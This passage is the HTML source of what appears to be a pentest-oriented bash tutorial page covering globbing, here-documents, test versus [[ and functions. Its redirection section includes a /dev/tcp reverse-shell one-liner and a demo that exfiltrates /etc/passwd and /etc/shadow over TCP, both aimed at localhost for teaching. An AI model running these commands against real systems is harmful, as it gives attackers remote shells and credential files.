ls <span class="o">[</span>A-c<span class="o">]</span>*
ls <span class="o">[</span>a-B<span class="o">]</span>*
ls <span class="o">[</span>A-B<span class="o">]</span>*
ls <span class="o">[</span>A-b<span class="o">]</span>*
<span class="o">(</span>
<span class="c1"># Collation order is A-Z, a-z</span>
<span class="nb">export</span> <span class="nv">LC_COLLATE</span><span class="o">=</span>C
ls <span class="o">[</span>a-c<span class="o">]</span>*
ls <span class="o">[</span>A-C<span class="o">]</span>*
ls <span class="o">[</span>a-C<span class="o">]</span>*
ls <span class="o">[</span>A-c<span class="o">]</span>*
ls <span class="o">[</span>a-B<span class="o">]</span>*
ls <span class="o">[</span>A-B<span class="o">]</span>*
ls <span class="o">[</span>A-b<span class="o">]</span>*
<span class="o">)</span>

rm -f a b c A B C
</pre></div>
</div>
</div>
<div class="section" id="redirection">
<span id="bash-redirection"></span><h3>10.1.4.4. Redirection<a class="headerlink" href="#redirection" title="Permalink to this headline">¶</a></h3>
<p>STDIN, STDOUT, and STDERR (0, 1, 2) can be redirected (see <a class="reference external" href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirections">Redirections</a>). Additional fd’s can be created and redirected to various locations including <code class="docutils literal notranslate"><span class="pre">/dev/tcp</span></code>. See <a class="reference external" href="http://www.catonmat.net/blog/bash-one-liners-explained-part-three/">Part III: Redirections</a> for a more pictorial description.</p>
<div class="section" id="here-documents">
<h4>10.1.4.4.1. Here Documents<a class="headerlink" href="#here-documents" title="Permalink to this headline">¶</a></h4>
<p>See <a class="reference external" href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Here-Documents">Here Documents</a> for a short introduction to here-documents.</p>
<p>A typical use we’ve made involves creating files in scripts, using “EOF” with quotes to avoid expansion (usually $variable expansion):</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat &gt; sample.sh &lt;&lt;<span class="s2">&quot;EOF&quot;</span>
<span class="c1">#!/usr/bin/env bash</span>

<span class="nv">X</span><span class="o">=</span><span class="m">1</span>
<span class="nb">echo</span> <span class="nv">$X</span>
EOF
chmod +x sample.sh
./sample.sh
rm -f sample.sh
</pre></div>
</div>
<p><a class="reference external" href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Here-Strings">Here Strings</a> are related but redirect strings:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Reproduce here-document above with string - note single quote &#39;, &quot; won&#39;t work</span>
cat &gt; sample.sh <span class="o">&lt;&lt;&lt;</span><span class="s1">&#39;#!/usr/bin/env bash</span>

<span class="s1">X=1</span>
<span class="s1">echo $X</span>
<span class="s1">&#39;</span>
chmod +x sample.sh
./sample.sh
rm -f sample.sh
</pre></div>
</div>
</div>
<div class="section" id="redirection-to-dev-tcp-using-proc-self-fd-9">
<h4>10.1.4.4.2. Redirection to <code class="docutils literal notranslate"><span class="pre">/dev/tcp</span></code> using <code class="docutils literal notranslate"><span class="pre">/proc/self/fd/9</span></code><a class="headerlink" href="#redirection-to-dev-tcp-using-proc-self-fd-9" title="Permalink to this headline">¶</a></h4>
<p>Use <code class="docutils literal notranslate"><span class="pre">exec</span></code> to add fd 9 which is redirected to <code class="docutils literal notranslate"><span class="pre">/dev/tcp/www.example.com/80</span></code>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>
<span class="nb">exec</span> <span class="m">9</span>&lt;&gt;/dev/tcp/www.example.com/80  <span class="c1"># open tcp port 80 to/from www.example.com</span>
ls -l /proc/self/fd/  <span class="c1"># show newly created fd</span>
ss -n dst <span class="k">$(</span>dig +short www.example.com<span class="k">)</span>  <span class="c1"># show newly created tcp connection</span>
<span class="c1"># Make a web request</span>
<span class="nb">echo</span> -ne <span class="s2">&quot;HEAD / HTTP/1.1\r\nhost: www.example.com\r\nConnection: close\r\n\r\n&quot;</span> &gt;<span class="p">&amp;</span><span class="m">9</span>
<span class="c1"># Get the response</span>
cat &lt;<span class="p">&amp;</span><span class="m">9</span>
<span class="o">)</span>
</pre></div>
</div>
</div>
<div class="section" id="redirection-to-remote-bash-shell">
<h4>10.1.4.4.3. Redirection to remote bash shell<a class="headerlink" href="#redirection-to-remote-bash-shell" title="Permalink to this headline">¶</a></h4>
<p>Although there are better ways to get a remote shell, if you have limited software on the attacked machine you can always use <code class="docutils literal notranslate"><span class="pre">dev/tcp</span></code>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1">############</span>
<span class="c1"># Terminal 1, the listener on port 6666 waiting for a bash shell</span>
<span class="nv">LISTENON</span><span class="o">=</span>localhost
<span class="nv">PORT</span><span class="o">=</span><span class="m">6666</span>
socat TCP-LISTEN:<span class="nv">$PORT</span>,bind<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$LISTENON</span><span class="s2">&quot;</span> -
<span class="c1">############</span>


<span class="c1">############</span>
<span class="c1"># Terminal 2, start up bash shell for remote exploitation</span>
<span class="nv">EXPLOITER</span><span class="o">=</span>localhost
<span class="nv">PORT</span><span class="o">=</span><span class="m">6666</span>
<span class="o">(</span> bash -i &gt;<span class="p">&amp;</span>/dev/tcp/<span class="nv">$EXPLOITER</span>/<span class="nv">$PORT</span> <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span> <span class="o">)</span>
<span class="c1">############</span>

<span class="c1">############</span>
<span class="c1"># Terminal 1, run bash shell commands and eventually terminate</span>
hostname
whoami
<span class="nb">exit</span>
<span class="c1">############</span>
</pre></div>
</div>
</div>
<div class="section" id="redirection-to-exfiltrate-data">
<h4>10.1.4.4.4. Redirection to exfiltrate data<a class="headerlink" href="#redirection-to-exfiltrate-data" title="Permalink to this headline">¶</a></h4>
<p>Here we have a little fun by running 2 terminal sessions on the same host simulating exfiltrating data using redirection. This example is interesting for 2 reasons: (1) redirection is to the TCP socket <code class="docutils literal notranslate"><span class="pre">/dev/tcp/4444</span></code>, and (2) a whole sequence of commands is redirected:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1">############</span>
<span class="c1"># Terminal 1, the listener on port 4444, output to host-session_*</span>
<span class="nv">LISTENON</span><span class="o">=</span>localhost
<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
<span class="nv">FILENAME</span><span class="o">=</span><span class="s2">&quot;host-session_</span><span class="k">$(</span>date +<span class="s1">&#39;%F_%H%M%S&#39;</span><span class="k">)</span><span class="s2">.txt&quot;</span>
socat -u TCP-LISTEN:<span class="nv">$PORT</span>,bind<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$LISTENON</span><span class="s2">&quot;</span>,fork,reuseaddr OPEN:<span class="s2">&quot;</span><span class="nv">$FILENAME</span><span class="s2">&quot;</span>,creat,append
<span class="c1">############</span>


<span class="c1">############</span>
<span class="c1"># Terminal 2, exfiltrate data to listener</span>
<span class="c1"># Since on the same host, show listener</span>
sudo ss -tnlp
<span class="c1"># Exfiltrate data</span>
<span class="nv">EXFILTRATE</span><span class="o">=</span>localhost
<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>
<span class="o">{</span>
<span class="nb">echo</span> <span class="s2">&quot;# dump /etc/passwd&quot;</span>
cat /etc/passwd
<span class="nb">echo</span> <span class="s2">&quot;# dump /etc/shadow&quot;</span>
cat /etc/shadow
<span class="nb">echo</span> <span class="s2">&quot;# ps -ef&quot;</span>
ps -ef
<span class="nb">echo</span> <span class="s2">&quot;# lastlog&quot;</span>
lastlog
<span class="o">}</span> <span class="m">1</span>&gt;/dev/tcp/<span class="nv">$EXFILTRATE</span>/<span class="nv">$PORT</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
<span class="c1">############</span>

<span class="c1">############</span>
<span class="c1"># Terminal 1, stop the listener and get data</span>
&lt;control-C&gt;
ls -l <span class="s2">&quot;</span><span class="nv">$FILENAME</span><span class="s2">&quot;</span>
rm -f <span class="s2">&quot;</span><span class="nv">$FILENAME</span><span class="s2">&quot;</span>
<span class="c1">############</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id24">
<h3>10.1.4.5. What is the difference between test, [ and [[ ?<a class="headerlink" href="#id24" title="Permalink to this headline">¶</a></h3>
<p>This section is based on <a class="reference external" href="http://mywiki.wooledge.org/BashFAQ/031">What is the difference between test, [ and [[ ?</a>:</p>
<blockquote>
<div>The theory behind all of this is that [ is a simple command, whereas [[ is a compound command. [ receives its arguments as any other command would, but most compound commands introduce a special parsing context which is performed before any other processing. Typically this step looks for special reserved words or control operators specific to each compound command which split it into parts or affect control-flow. The Bash test expression’s logical and/or operators can short-circuit because they are special in this way (as are e.g. ;;, elif, and else). Contrast with ArithmeticExpression, where all expansions are performed left-to-right in the usual way, with the resulting string being subject to interpretation as arithmetic.</div></blockquote>
<div class="section" id="commands-vs-keywords">
<h4>10.1.4.5.1. Commands vs keywords<a class="headerlink" href="#commands-vs-keywords" title="Permalink to this headline">¶</a></h4>
<p>Let’s look at this. First, <code class="docutils literal notranslate"><span class="pre">[</span></code> and <code class="docutils literal notranslate"><span class="pre">test</span></code> are shell builtin’s while [[ and (( are keywords:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># 2 builtins</span>
<span class="nb">type</span> <span class="s2">&quot;[&quot;</span>
<span class="nb">type</span> <span class="s2">&quot;test&quot;</span>
<span class="c1"># 1 keyword</span>
<span class="nb">type</span> <span class="s2">&quot;[[&quot;</span>
<span class="c1"># keyword but errors out</span>
<span class="nb">type</span> <span class="s2">&quot;((&quot;</span>
</pre></div>
</div>
</div>
<div class="section" id="the-canary-echo-something-1-2">
<h4>10.1.4.5.2. The canary: $(echo something 1&gt;&amp;2)<a class="headerlink" href="#the-canary-echo-something-1-2" title="Permalink to this headline">¶</a></h4>
<p>To illustrate the difference, <a class="reference external" href="http://mywiki.wooledge.org/BashFAQ/031">What is the difference between test, [ and [[ ?</a> uses a canary:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;This doesn&#39;t do what you think...&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="k">)</span>
</pre></div>
</div>
<p>The idea is that this code will display something (a noticeable side effect) without affecting STDOUT (so the <code class="docutils literal notranslate"><span class="pre">bash</span></code> line isn’t affected).</p>
<p>Placed in key places it illustrates when keywords affect order of execution/expansion.</p>
</div>
<div class="section" id="id27">
<h4>10.1.4.5.3. ((<a class="headerlink" href="#id27" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="http://mywiki.wooledge.org/BashFAQ/031">What is the difference between test, [ and [[ ?</a>:</p>
<blockquote>
<div>The arithmetic compound command has no special operators. It has only one evaluation context - a single arithmetic expression. Arithmetic expressions have operators too, some of which affect control flow during the arithmetic evaluation step (which happens last).</div></blockquote>
<p>Consider the following statement:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">((</span> <span class="m">1</span> + <span class="nv">1</span> <span class="o">==</span> <span class="m">2</span> ? <span class="m">1</span> : <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;This doesn&#39;t do what you think...&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="m">1</span><span class="k">)</span> <span class="o">))</span>
</pre></div>
</div>
<p>The arithmetic evaluation happens <strong>last</strong>, meaning the canary is executed before the `` ? : `` could indicate it’s not needed. Here’s what happens:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">((</span> <span class="m">1</span> + <span class="nv">1</span> <span class="o">==</span> <span class="m">2</span> ? <span class="m">1</span> : <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;This doesn&#39;t do what you think...&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="m">1</span><span class="k">)</span> <span class="o">))</span>

<span class="c1"># The ternary expression &quot;EXP ? EXP1 : EXP2&quot; is not evaluated first</span>
<span class="c1"># Instead, $(..) is expanded ...</span>
<span class="c1">#   So &quot;This doesn&#39;t do what you think...&quot; is output to STDERR.</span>
<span class="c1">#   Then &quot;echo 1&quot; replaces $(..) and we&#39;re left with</span>
<span class="o">((</span> <span class="m">1</span> + <span class="nv">1</span> <span class="o">==</span> <span class="m">2</span> ? <span class="m">1</span> : <span class="m">1</span> <span class="o">))</span>
<span class="c1"># Then the arithmetic can be evaluated:</span>
<span class="c1">#  &quot;1 + 1 == 2&quot; is true, so &quot;? 1 :&quot; returns 1 as the value.</span>
<span class="c1">#  The corresponding RC ($?) is set to 0.</span>
</pre></div>
</div>
<p>You can see this by trying these modifications:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">((</span> <span class="m">1</span> + <span class="nv">1</span> <span class="o">==</span> <span class="m">2</span> ? <span class="m">1</span> : <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;This doesn&#39;t do what you think...&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="m">1</span><span class="k">)</span> <span class="o">))</span>
<span class="nb">echo</span> <span class="nv">$?</span>
<span class="o">((</span> <span class="m">1</span> + <span class="nv">1</span> <span class="o">==</span> <span class="m">2</span> ? <span class="m">0</span> : <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;This doesn&#39;t do what you think...&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="m">1</span><span class="k">)</span> <span class="o">))</span>
<span class="nb">echo</span> <span class="nv">$?</span>
<span class="o">((</span> <span class="m">1</span> + <span class="nv">2</span> <span class="o">==</span> <span class="m">2</span> ? <span class="m">0</span> : <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;This doesn&#39;t do what you think...&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="m">1</span><span class="k">)</span> <span class="o">))</span>
<span class="nb">echo</span> <span class="nv">$?</span>
<span class="o">((</span> <span class="m">1</span> + <span class="nv">2</span> <span class="o">==</span> <span class="m">2</span> ? <span class="m">1</span> : <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;This doesn&#39;t do what you think...&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="m">0</span><span class="k">)</span> <span class="o">))</span>
<span class="nb">echo</span> <span class="nv">$?</span>
</pre></div>
</div>
</div>
<div class="section" id="id29">
<h4>10.1.4.5.4. [[<a class="headerlink" href="#id29" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="http://mywiki.wooledge.org/BashFAQ/031">What is the difference between test, [ and [[ ?</a>:</p>
<blockquote>
<div>[ receives its arguments as any other command would, but most compound commands introduce a special parsing context which is performed before any other processing. Typically this step looks for special reserved words or control operators specific to each compound command which split it into parts or affect control-flow.</div></blockquote>
<p>It provides this example which we extend:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">[[</span> <span class="s1">&#39;1 + 1&#39;</span> -eq <span class="m">2</span> <span class="o">&amp;&amp;</span> <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;...but this probably does what you expect.&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="k">)</span> <span class="o">]]</span>
<span class="c1"># Change to or || to show $(echo ...) not executed</span>
<span class="o">[[</span> <span class="s1">&#39;1 + 1&#39;</span> -eq <span class="m">2</span> <span class="o">||</span> <span class="k">$(</span><span class="nb">echo</span> <span class="s2">&quot;...but this probably does what you expect.&quot;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="k">)</span> <span class="o">]]</span>
</pre></div>
</div>
</div>
<div class="section" id="test-and">
<h4>10.1.4.5.5. <code class="docutils literal notranslate"><span class="pre">test</span></code> and <code class="docutils literal notranslate"><span class="pre">[</span></code><a class="headerlink" href="#test-and" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="http://mywiki.wooledge.org/BashFAQ/031">What is the difference between test, [ and [[ ?</a>:</p>
<blockquote>
<div><p><code class="docutils literal notranslate"><span class="pre">test</span></code> and <code class="docutils literal notranslate"><span class="pre">[</span></code> are commands and they both receive “arguments as any other command would.</p>
<p>…</p>
<p>The Bash test expression’s logical and/or operators can short-circuit because they are special in this way (as are e.g. ;;, elif, and else).</p>
</div></blockquote>
<p>It provides this (slightly modified) example:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># [ is a command, not a keyword</span>
<span class="o">[</span> <span class="k">$((</span><span class="m">1</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span> -eq <span class="m">2</span> -o <span class="k">$(</span><span class="nb">echo</span> <span class="s1">&#39;No short-circuit&#39;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;1 -eq 0&#39;</span><span class="p">;</span><span class="k">)</span> <span class="o">]</span>
<span class="nb">echo</span> <span class="nv">$?</span>
</pre></div>
</div>
<p>Again, we modify the command to illustrate what is happening:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># test same as [</span>
<span class="nb">test</span> <span class="k">$((</span><span class="m">1</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span> -eq <span class="m">2</span> -o <span class="k">$(</span><span class="nb">echo</span> <span class="s1">&#39;No short-circuit&#39;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;1 -eq 0&#39;</span><span class="p">;</span><span class="k">)</span>
<span class="nb">echo</span> <span class="nv">$?</span>
<span class="c1"># change first test to false, so result is second test which is false</span>
<span class="nb">test</span> <span class="k">$((</span><span class="m">1</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span> -ne <span class="m">2</span> -o <span class="k">$(</span><span class="nb">echo</span> <span class="s1">&#39;No short-circuit&#39;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;1 -eq 0&#39;</span><span class="p">;</span><span class="k">)</span>
<span class="nb">echo</span> <span class="nv">$?</span>
<span class="c1"># Same, except second test is now true</span>
<span class="nb">test</span> <span class="k">$((</span><span class="m">1</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span> -eq <span class="m">3</span> -o <span class="k">$(</span><span class="nb">echo</span> <span class="s1">&#39;No short-circuit&#39;</span> &gt;<span class="p">&amp;</span><span class="m">2</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;1 -eq 1&#39;</span><span class="p">;</span><span class="k">)</span>
<span class="nb">echo</span> <span class="nv">$?</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="functions">
<h3>10.1.4.6. Functions<a class="headerlink" href="#functions" title="Permalink to this headline">¶</a></h3>
<p>See <a class="reference external" href="https://www.gnu.org/software/bash/manual/html_node/Shell-Functions.html#Shell-Functions">Shell functions</a> for a short introduction to functions.</p>
<p>Functions are defined in 1 of 2 ways: <code class="docutils literal notranslate"><span class="pre">name</span> <span class="pre">()</span> <span class="pre">compound-command</span> <span class="pre">[</span> <span class="pre">redirections</span> <span class="pre">]</span></code> or <code class="docutils literal notranslate"><span class="pre">function</span> <span class="pre">name</span> <span class="pre">[()]</span> <span class="pre">compound-command</span> <span class="pre">[</span> <span class="pre">redirections</span> <span class="pre">]</span></code>.</p>
<p>Here is an example from TLDP <a class="reference external" href="http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_11_02.html">Examples of functions in scripts</a>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>pathmunge <span class="o">()</span> <span class="o">{</span>
        <span class="k">if</span> ! <span class="nb">echo</span> <span class="nv">$PATH</span> <span class="p">|</span> /bin/egrep -q <span class="s2">&quot;(^|:)</span><span class="nv">$1</span><span class="s2">(</span>$<span class="s2">|:)&quot;</span> <span class="p">;</span> <span class="k">then</span>
           <span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;</span><span class="nv">$2</span><span class="s2">&quot;</span> <span class="o">=</span> <span class="s2">&quot;after&quot;</span> <span class="o">]</span> <span class="p">;</span> <span class="k">then</span>
              <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:<span class="nv">$1</span>
           <span class="k">else</span>
              <span class="nv">PATH</span><span class="o">=</span><span class="nv">$1</span>:<span class="nv">$PATH</span>
           <span class="k">fi</span>
        <span class="k">fi</span>
<span class="o">}</span>

<span class="c1"># Path manipulation</span>
<span class="k">if</span> <span class="o">[</span> <span class="sb">`</span>id -u<span class="sb">`</span> <span class="o">=</span> <span class="m">0</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
        pathmunge /sbin
        pathmunge /usr/sbin
        pathmunge /usr/local/sbin
<span class="k">fi</span>

pathmunge /usr/X11R6/bin after

<span class="nb">unset</span> pathmunge
</pre></div>
</div>
</div>
</div>
</div>


           </div>
           
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="python.html" class="btn btn-neutral float-right" title="10.2. Python" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="../pentest_scripting.html" class="btn btn-neutral" title="10. Pentest scripting" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            LANGUAGE:'None',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  <script type="text/javascript" src="../_static/js/theme.js"></script>

  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>